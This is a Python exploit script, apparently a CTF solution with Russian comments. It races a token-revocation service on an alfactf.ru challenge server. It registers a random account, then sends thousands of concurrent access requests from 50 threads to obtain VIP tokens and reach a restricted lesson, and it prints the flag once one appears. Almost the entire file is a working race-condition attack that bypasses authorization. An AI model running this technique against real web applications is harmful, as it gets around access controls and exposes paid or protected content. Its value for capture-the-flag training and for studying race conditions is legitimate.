from __future__ import annotations
import requests
import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter

BASE_URL = "https://basecamp-srv-vcpvy5wb.alfactf.ru"
USERNAME = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(12))
PASSWORD = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(12))
ROUNDS = 50             # взял наугад, другие варианты тоже могут подойти
WORKERS = 50            # взял наугад, другие варианты тоже могут подойти
HTTP_TIMEOUT = 20

def make_session():
    s = requests.Session()
    adapter = HTTPAdapter(pool_connections=WORKERS, pool_maxsize=WORKERS * 2)   # используем HTTPAdapter для создания пула TCP соединений. Таким образом соединения будут переиспользоваться и запросы будут выполняться быстрее
    s.mount("https://", adapter)
    s.mount("http://", adapter)

    return s

def race_token(auth_token):
    session = make_session()

    def race_revoke(_):
        try:
            headers = {"Content-Type": "application/json", "Authorization": f"Bearer {auth_token}"}
            r = session.post(f"{BASE_URL}/api/courses/4/lessons/15/request-access", headers=headers, timeout=HTTP_TIMEOUT)
            if r.ok:
                vip_token = r.json()["token"]
                headers = {"Authorization": f"Bearer {vip_token}"}
                r = session.get(f"{BASE_URL}/api/courses/4", headers=headers, timeout=HTTP_TIMEOUT)
        except Exception as e:
            print(f"[WARN] on race_revoke: {e}")

    with ThreadPoolExecutor(max_workers=WORKERS) as ex:    # запускаем ThreadPoolExecutor с параллельным вызовом функции race_revoke, которая нагружает сервис отзыва токенов
        for _ in ex.map(race_revoke, range(WORKERS * ROUNDS)):
            pass

    while True:    # с первого раза может не получиться, поэтому продолжаем нагружать сервис, пока не получим флаг
        headers = {"Content-Type": "application/json", "Authorization": f"Bearer {auth_token}"}
        r = session.post(f"{BASE_URL}/api/courses/4/lessons/15/request-access", headers=headers, timeout=HTTP_TIMEOUT)
        if r.ok:
            vip_token = r.json()["token"]
            headers = {"Authorization": f"Bearer {vip_token}"}
            r = session.get(f"{BASE_URL}/api/courses/4", headers=headers, timeout=HTTP_TIMEOUT)
            if r.ok:
                slug_token = r.json()["lessons"][-1]["slug"]     # в ответе на /api/courses/4 необходимый урок последний, забираем slug токен от него
                r = session.get(f"{BASE_URL}/api/courses/4/lessons/access/{slug_token}", headers=headers, timeout=HTTP_TIMEOUT)
                if "alfa" in r.text:
                    print(r.text)
                    break


def main():
    print(f"{USERNAME}:{PASSWORD}")
    session = make_session()
    data = {"username": USERNAME, "password": PASSWORD}
    headers = {"Content-Type": "application/json"}
    r = session.post(f"{BASE_URL}/api/auth/register", headers=headers, json=data, timeout=HTTP_TIMEOUT)
    if not r.ok and r.status_code != 409:
        print(r.status_code)
        print(r.headers)
        print(r.text)
        return

    data = {"username": USERNAME, "password": PASSWORD}
    headers = {"Content-Type": "application/json"}
    r = session.post(f"{BASE_URL}/api/auth/login", headers=headers, json=data, timeout=HTTP_TIMEOUT)
    if not r.ok:
        print(r.status_code)
        print(r.headers)
        print(r.text)
        return

    auth_token = r.json()['token']
    print(auth_token)
    race_token(auth_token)

main()